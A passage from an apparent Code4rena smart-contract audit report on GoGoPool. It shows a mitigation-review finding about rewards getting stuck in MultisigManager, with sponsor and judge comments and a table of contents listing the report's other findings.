3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Original Issue</h3>\n<p>M-21: <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/143\">Division by zero error can block RewardsPool#startRewardCycle if all multisig wallet are disabled</a></p>\n<h3 id=\"comments-1\" style=\"position:relative;\"><a href=\"#comments-1\" aria-label=\"comments 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Comments</h3>\n<p>The protocol provides an external function <code>startRewardsCycle()</code> so that anyone can start a new reward cycle if necessary.<br>\nBefore mitigation, there was an edge case where this function will revert due to division by zero.\nEdge case: there are no multisigs enabled. (possible when <code>Ocyticus.disableAllMultisigs(), Ocyticus.pauseEverything()</code> is called)</p>\n<h3 id=\"mitigation-1\" style=\"position:relative;\"><a href=\"#mitigation-1\" aria-label=\"mitigation 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation</h3>\n<p><a href=\"https://github.com/multisig-labs/gogopool/pull/37\">PR #37</a><br>\nIf no multisig is enabled, the mitigation sends the rewards to the <code>MultisigManager</code> and it makes sense.<br>\nBut this created another issue. There is no way to retrieve the rewards back from the <code>MultisigManager</code>.</p>\n<h3 id=\"new-issue-1\" style=\"position:relative;\"><a href=\"#new-issue-1\" aria-label=\"new issue 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>New issue</h3>\n<p>There is no way to retrieve the rewards from the <code>MultisigManager</code> and rewards are locked in the vault.</p>\n<h3 id=\"code-snippet-1\" style=\"position:relative;\"><a href=\"#code-snippet-1\" aria-label=\"code snippet 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Code snippet</h3>\n<p><a href=\"https://github.com/multisig-labs/gogopool/blob/4bcef8b1d4e595c9ba41a091b2ebf1b45858f022/contracts/contract/RewardsPool.sol#L229\">https://github.com/multisig-labs/gogopool/blob/4bcef8b1d4e595c9ba41a091b2ebf1b45858f022/contracts/contract/RewardsPool.sol#L229</a></p>\n<h3 id=\"impact-6\" style=\"position:relative;\"><a href=\"#impact-6\" aria-label=\"impact 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>There is no way to retrieve the rewards from the <code>MultisigManager</code> and rewards are locked in the vault.</p>\n<h3 id=\"proof-of-concept-29\" style=\"position:relative;\"><a href=\"#proof-of-concept-29\" aria-label=\"proof of concept 29 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The rewards that were accrued in this specific edge case are locked in the <code>MultisigManager</code>.<br>\nIt is understood that the funds are not lost and the protocol can be upgraded with a new <code>MultisigManager</code> contract with a proper function.<br>\nI evaluate the severity of the new issue as Medium because funds are locked in some specific edge cases and only withdrawable after contract upgrades.</p>\n<h3 id=\"recommended-additional-mitigation-1\" style=\"position:relative;\"><a href=\"#recommended-additional-mitigation-1\" aria-label=\"recommended additional mitigation 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended additional mitigation</h3>\n<p>Add a new external function in the <code>MultisigManager</code> with <code>guardianOrSpecificRegisteredContract(\"Ocyticus\", msg.sender)</code> modifier and distribute the pending rewards to the active multisigs.</p>\n<h3 id=\"conclusion-1\" style=\"position:relative;\"><a href=\"#conclusion-1\" aria-label=\"conclusion 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Conclusion</h3>\n<p>Mitigation error - created another issue for the same edge case.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/46#issuecomment-1433705450\">0xju1ie (GoGoPool) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>I think this is valid. We do plan on adding a claim or withdrawal method that allows an enabled multisig to receive those funds. This can also be easily added with an upgrade once the issue occurs if we arent able to add it to this version.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/46#issuecomment-1435717627\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Seems like <code>MultisigManager</code> doesn’t offer a sweep function, which would cause tokens to be stuck.</p>\n<p>Due to the conditionality, I agree with Medium Severity.</p>\n</blockquote>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk6 { color: #D7BA7D; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-6\">High Risk Findings (6)</a></p>\n<ul>\n<li><a href=\"#h-01-avax-assigned-high-water-is-updated-incorrectly\">[H-01] AVAX Assigned High Water is updated incorrectly</a></li>\n<li><a href=\"#h-02-protocoldao-lacks-a-method-to-take-out-ggp\">[H-02] ProtocolDAO lacks a method to take out GGP</a></li>\n<li><a href=\"#h-03-node-operator-is-getting-slashed-for-full-duration-even-though-rewards-are-distributed-based-on-a-14-day-cycle\">[H-03] Node operator is getting slashed for full duration even though rewards are distributed based on a 14 day cycle</a></li>\n<li><a href=\"#h-04-hijacking-of-node-operators-minipool-causes-loss-of-staked-funds\">[H-04] Hijacking of node operators minipool causes loss of staked funds</a></li>\n<li><a href=\"#h-05-inflation-of-ggavax-share-price-by-first-depositor\">[H-05] Inflation of ggAVAX share price by first depositor</a></li>\n<li><a href=\"#h-06-minipoolmanager-node-operator-can-avoid-being-slashed\">[H-06] MinipoolManager: node operator can avoid being slashed</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-22\">Medium Risk Findings (22)</a></p>\n<ul>\n<li><a href=\"#m-01-rewardspoolsol--it-is-safe-to-have-the-startrewardscycle-with-whennotpaused-modifier\">[M-01] <code>RewardsPool.sol</code> : It is safe to have the <code>startRewardsCycle</code> with <code>WhenNotPaused</code> modifier</a></li>\n<li><a href=\"#m-02-coding-logic-of-the-contract-upgrading-renders-upgrading-contracts-impractical\">[M-02] Coding logic of the contract upgrading renders upgrading contracts impractical</a></li>\n<li><a href=\"#m-03-nodeop-funds-may-be-trapped-by-a-invalid-state-transition\">[M-03] NodeOp funds may be trapped by a invalid state transition</a></li>\n<li><a href=\"#m-04-requirenextactivemultisig-will-always-return-the-first-enabled-multisig-which-increases-the-probability-of-stuck-minipools\">[M-04] <code>requireNextActiveMultisig</code> will always return the first enabled multisig which increases the probability of stuck minipools</a></li>\n<li><a href=\"#m-05-bypass-whennotpaused-modifier\">[M-05] Bypass <code>whenNotPaused</code> modifier</a></li>\n<li><a href=\"#m-06-inflation-rate-can-be-reduced-by-half-at-most-if-it-gets-called-every-199-interval\">[M-06] Inflation rate can be reduced by half at most if it gets called every 1.99 interval</a></li>\n<li><a href=\"#m-07-rialto-may-not-be-able-to-cancel-minipools-created-by-contracts-that-cannot-receive-avax\">[M-07] Rialto may not be able to cancel minipools created by contracts that cannot receive AVAX</a></li>\n<li><a href=\"#m-08-recreated-pools-receive-a-wrong-avax-amount-due-to-miscalculated-compounded-liquid-staker-amount\">[M-08] Recreated pools receive a wrong AVAX amount due to miscalculated compounded liquid staker amount</a></li>\n<li><a href=\"#m-09-state-transition-minipools-can-be-created-using-other-operators-avax-deposit-via-recreateminipool\">[M-09] State Transition: Minipools can be created using other operator’s AVAX deposit via recreateMinipool</a></li>\n<li><a href=\"#m-10-functions-cancelminipool-doesnt-reset-the-value-of-the-rewardsstarttime-for-user-when-users-minipoolcount-is-zero\">[M-10] Functions <code>cancelMinipool()</code> doesn’t reset the value of the <code>RewardsStartTime</code> for user when user’s <code>minipoolcount</code> is zero</a></li>\n<li><a href=\"#m-11-multisigmanager-may-not-be-able-to-add-a-valid-multisig\">[M-11] MultisigManager may not be able to add a valid Multisig</a></li>\n<li><a href=\"#m-12-cancellation-of-minipool-may-skip-minipoolcancelmoratoriumseconds-checking-if-it-was-cancelled-before\">[M-12] Cancellation of minipool may skip <code>MinipoolCancelMoratoriumSeconds</code> checking if it was cancelled before</a></li>\n<li><a href=\"#m-13-slashing-fails-when-node-operator-doesnt-have-enough-staked-ggp\">[M-13] Slashing fails when node operator doesn’t have enough staked <code>GGP</code></a></li>\n<li><a href=\"#m-14-any-duration-can-be-passed-by-node-operator\">[M-14] Any duration can be passed by node operator</a></li>\n<li><a href=\"#m-15-wrong-reward-distribution-between-early-and-late-depositors-because-of-the-late-syncrewards-call-in-the-cycle-syncreward-logic-should-be-executed-in-each-withdraw-or-deposits-without-reverting\">[M-15] Wrong reward distribution between early and late depositors because of the late <code>syncRewards()</code> call in the cycle, <code>syncReward()</code> logic should be executed in each withdraw or deposits (without reverting)</a></li>\n<li><a href=\"#m-16-maxwithdraw-and-maxredeem-doesnt-return-correct-value-which-can-make-other-contracts-fail-while-working-with-protocol\">[M-16] <code>maxWithdraw()</code> and <code>maxRedeem()</code> doesn’t return correct value which can make other contracts fail while working with protocol</a></li>\n<li><a href=\"#m-17-nodeop-can-get-rewards-even-if-there-was-an-error-in-registering-the-node-as-a-validator\">[M-17] NodeOp can get rewards even if there was an error in registering the node as a validator</a></li>\n<li><a href=\"#m-18-users-may-not-be-able-to-redeem-their-shares-due-to-underflow\">[M-18] Users may not be able to redeem their shares due to underflow</a></li>\n<li><a href=\"#m-19-minipoolmanager-recordstakingerror-function-does-not-decrease-minipoolcount-leading-to-too-high-ggp-rewards-for-staker\">[M-19] MinipoolManager: <code>recordStakingError</code> function does not decrease <code>minipoolCount</code> leading to too high GGP rewards for staker</a></li>\n<li><a href=\"#m-20-tokenggavax-maxdeposit-and-maxmint-return-wrong-value-when-contract-is-paused\">[M-20] TokenggAVAX: maxDeposit and maxMint return wrong value when contract is paused</a></li>\n<li><a href=\"#m-21-division-by-zero-error-can-block-rewardspoolstartrewardcycle-if-all-multisig-wallet-are-disabled\">[M-21] Division by zero error can block <code>RewardsPool#startRewardCycle</code> if all multisig wallet are disabled</a></li>\n<li><a href=\"#m-22-inaccurate-estimation-of-validation-rewards-from-function-expectedrewardava-in-minipoolmanagersol\">[M-22] Inaccurate estimation of validation rewards from function <code>ExpectedRewardAVA</code> in <code>MiniPoolManager.sol</code></a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#summary-1\">Summary</a></li>\n<li><a href=\"#l01-inflation-not-locked-for-four-years\">L‑01 Inflation not locked for four years</a></li>\n<li><a href=\"#l02-contract-will-stop-functioning-in-the-year-2106\">L‑02 Contract will stop functioning in the year 2106</a></li>\n<li><a href=\"#l03-lower-level-initializations-should-come-first\">L‑03 Lower-level initializations should come first</a></li>\n<li><a href=\"#l04-incorrect-percentage-conversion\">L‑04 Incorrect percentage conversion</a></li>\n<li><a href=\"#l05-loss-of-precision\">L‑05 Loss of precision</a></li>\n<li><a href=\"#l06-signatures-vulnerable-to-malleability-attacks\">L‑06 Signatures vulnerable to malleability attacks</a></li>\n<li><a href=\"#l07-require-should-be-used-instead-of-assert\">L‑07 <code>require()</code> should be used instead of <code>assert()</code></a></li>\n<li><a href=\"#n01-common-code-should-be-refactored\">N‑01 Common code should be refactored</a></li>\n<li><a href=\"#n02-string-constants-used-in-multiple-places-should-be-defined-as-constants\">N‑02 String constants used in multiple places should be defined as constants</a></li>\n<li><a href=\"#n03-constants-in-comparisons-should-appear-on-the-left-side\">N‑03 Constants in comparisons should appear on the left side</a></li>\n<li><a href=\"#n04-inconsistent-address-separator-in-storage-names\">N‑04 Inconsistent address separator in storage names</a></li>\n<li><a href=\"#n05-confusing-function-name\">N‑05 Confusing function name</a></li>\n<li><a href=\"#n06-misplaced-punctuation\">N‑06 Misplaced punctuation</a></li>\n<li><a href=\"#n07-upgradeable-contract-is-missing-a-__gap50-storage-variable-to-allow-for-new-storage-variables-in-later-versions\">N‑07 Upgradeable contract is missing a <code>__gap[50]</code> storage variable to allow for new storage variables in later versions</a></li>\n<li><a href=\"#n08-import-declarations-should-import-specific-identifiers-rather-than-the-whole-file\">N‑08 Import declarations should import specific identifiers, rather than the whole file</a></li>\n<li><a href=\"#n09-missing-initializer-modifier-on-constructor\">N‑09 Missing <code>initializer</code> modifier on constructor</a></li>\n<li><a href=\"#n10-the-nonreentrant-modifier-should-occur-before-all-other-modifiers\">N‑10 The <code>nonReentrant</code> <code>modifier</code> should occur before all other modifiers</a></li>\n<li><a href=\"#n11-override-function-arguments-that-are-unused-should-have-the-variable-name-removed-or-commented-out-to-avoid-compiler-warnings\">N‑11 <code>override</code> function arguments that are unused should have the variable name removed or commented out to avoid compiler warnings</a></li>\n<li><a href=\"#n12-constants-should-be-defined-rather-than-using-magic-numbers\">N‑12 <code>constant</code>s should be defined rather than using magic numbers</a></li>\n<li><a href=\"#n13-missing-event-and-or-timelock-for-critical-parameter-change\">N‑13 Missing event and or timelock for critical parameter change</a></li>\n<li><a href=\"#n14-events-that-mark-critical-parameter-changes-should-contain-both-the-old-and-the-new-value\">N‑14 Events that mark critical parameter changes should contain both the old and the new value</a></li>\n<li><a href=\"#n15-use-a-more-recent-version-of-solidity\">N‑15 Use a more recent version of solidity</a></li>\n<li><a href=\"#n16-use-a-more-recent-version-of-solidity\">N‑16 Use a more recent version of solidity</a></li>\n<li><a href=\"#n17-constant-redefined-elsewhere\">N‑17 Constant redefined elsewhere</a></li>\n<li><a href=\"#n18-lines-are-too-long\">N‑18 Lines are too long</a></li>\n<li><a href=\"#n19-variable-names-that-consist-of-all-capital-letters-should-be-reserved-for-constantimmutable-variables\">N‑19 Variable names that consist of all capital letters should be reserved for <code>constant</code>/<code>immutable</code> variables</a></li>\n<li><a href=\"#n20-using--without-specifying-an-upper-bound-is-unsafe\">N‑20 Using <code>></code>/<code>>=</code> without specifying an upper bound is unsafe</a></li>\n<li><a href=\"#n21-typos\">N‑21 Typos</a></li>\n<li><a href=\"#n22-file-is-missing-natspec\">N‑22 File is missing NatSpec</a></li>\n<li><a href=\"#n23-natspec-is-incomplete\">N‑23 NatSpec is incomplete</a></li>\n<li><a href=\"#n24-not-using-the-named-return-variables-anywhere-in-the-function-is-confusing\">N‑24 Not using the named return variables anywhere in the function is confusing</a></li>\n<li><a href=\"#n25-contracts-should-have-full-test-coverage\">N‑25 Contracts should have full test coverage</a></li>\n<li><a href=\"#n26-large-or-complicated-code-bases-should-implement-fuzzing-tests\">N‑26 Large or complicated code bases should implement fuzzing tests</a></li>\n<li><a href=\"#n27-function-ordering-does-not-follow-the-solidity-style-guide\">N‑27 Function ordering does not follow the Solidity style guide</a></li>\n<li><a href=\"#n28-contract-does-not-follow-the-solidity-style-guides-suggested-layout-ordering\">N‑28 Contract does not follow the Solidity style guide’s suggested layout ordering</a></li>\n<li><a href=\"#n29-open-todos\">N‑29 Open TODOs</a></li>\n<li><a href=\"#excluded-findings\">Excluded findings</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#summary-2\">Summary</a></li>\n<li><a href=\"#g01-state-variables-can-be-packed-into-fewer-storage-slots\">G‑01 State variables can be packed into fewer storage slots</a></li>\n<li><a href=\"#g02-use-a-more-recent-version-of-solidity\">G‑02 Use a more recent version of solidity</a></li>\n<li><a href=\"#g03-ii-should-be-uncheckediuncheckedi-when-it-is-not-possible-for-them-to-overflow-as-is-the-case-when-used-in-for--and-while-loops\">G‑03 <code>++i</code>/<code>i++</code> should be <code>unchecked{++i}</code>/<code>unchecked{i++}</code> when it is not possible for them to overflow, as is the case when used in <code>for</code>- and <code>while</code>-loops</a></li>\n<li><a href=\"#g04-internal-functions-only-called-once-can-be-inlined-to-save-gas\">G‑04 <code>internal</code> functions only called once can be inlined to save gas</a></li>\n<li><a href=\"#g05-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\">G‑05 Functions guaranteed to revert when called by normal users can be marked <code>payable</code></a></li>\n<li><a href=\"#g06-optimize-names-to-save-gas\">G‑06 Optimize names to save gas</a></li>\n<li><a href=\"#g07-use-custom-errors-rather-than-revertrequire-strings-to-save-gas\">G‑07 Use custom errors rather than <code>revert()</code>/<code>require()</code> strings to save gas</a></li>\n<li><a href=\"#g08-add-unchecked--for-subtractions-where-the-operands-cannot-underflow-because-of-a-previous-require-or-if-statement\">G‑08 Add <code>unchecked {}</code> for subtractions where the operands cannot underflow because of a previous <code>require()</code> or <code>if</code>-statement</a></li>\n<li><a href=\"#g09-multiple-accesses-of-a-mappingarray-should-use-a-local-variable-cache\">G‑09 Multiple accesses of a mapping/array should use a local variable cache</a></li>\n<li><a href=\"#g10-state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage\">G‑10 State variables should be cached in stack variables rather than re-reading them from storage</a></li>\n<li><a href=\"#g11-modification-of-getx-setx-deletex-addx-and-subx-in-baseabstractsol-increases-gas-savings-in-g10\">G‑11 Modification of <code>getX()</code>, <code>setX()</code>, <code>deleteX()</code>, <code>addX()</code> and <code>subX()</code> in <code>BaseAbstract.sol</code> increases gas savings in G‑10</a></li>\n<li><a href=\"#g12-x--y-costs-more-gas-than-x--x--y-for-state-variables---too\">G‑12 <code>&#x3C;x> += &#x3C;y></code> costs more gas than <code>&#x3C;x> = &#x3C;x> + &#x3C;y></code> for state variables (<code>-=</code> too)</a></li>\n<li><a href=\"#g13-division-by-two-should-use-bit-shifting\">G‑13 Division by two should use bit shifting</a></li>\n<li><a href=\"#g14-the-result-of-function-calls-should-be-cached-rather-than-re-calling-the-function\">G‑14 The result of function calls should be cached rather than re-calling the function</a></li>\n<li><a href=\"#g15-dont-compare-boolean-expressions-to-boolean-literals\">G‑15 Don’t compare boolean expressions to boolean literals</a></li>\n<li><a href=\"#g16-splitting-require-statements-that-use--saves-gas\">G‑16 Splitting <code>require()</code> statements that use <code>&#x26;&#x26;</code> saves gas</a></li>\n<li><a href=\"#g17-stack-variable-used-as-a-cheaper-cache-for-a-state-variable-is-only-used-once\">G‑17 Stack variable used as a cheaper cache for a state variable is only used once</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#mitigation-review\">Mitigation Review</a></p>\n<ul>\n<li><a href=\"#introduction\">Introduction</a></li>\n<li><a href=\"#overview-of-changes\">Overview of Changes</a></li>\n<li><a href=\"#mitigation-review-scope\">Mitigation Review Scope</a></li>\n<li><a href=\"#mitigation-review-summary\">Mitigation Review Summary</a></li>\n<li><a href=\"#mrm-01-the-node-operators-are-likely-to-be-slashed-in-an-unfair-way\">[MR:M-01] The node operators are likely to be slashed in an unfair way</a></li>\n<li><a href=\"#mrm-02-deficiency-of-slashed-ggp-amount-should-be-made-up-from-node-operators-avax\">[MR:M-02] Deficiency of slashed GGP amount should be made up from node operator’s AVAX</a></li>\n<li><a href=\"#mrm-03-amountavailableforstaking-not-fully-utilized-with-compoundedavaxnodeopamt-easily-forfeited\">[MR:M-03] <code>amountAvailableForStaking()</code> not fully utilized with <code>compoundedAvaxNodeOpAmt</code> easily forfeited</a></li>\n<li><a href=\"#mrm-04-there-is-no-way-to-retrieve-the-rewards-from-the-multisigmanager-and-rewards-are-locked-in-the-vault\">[MR:M-04] There is no way to retrieve the rewards from the MultisigManager and rewards are locked in the vault</a></li>\n</ul>\n</li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>"
}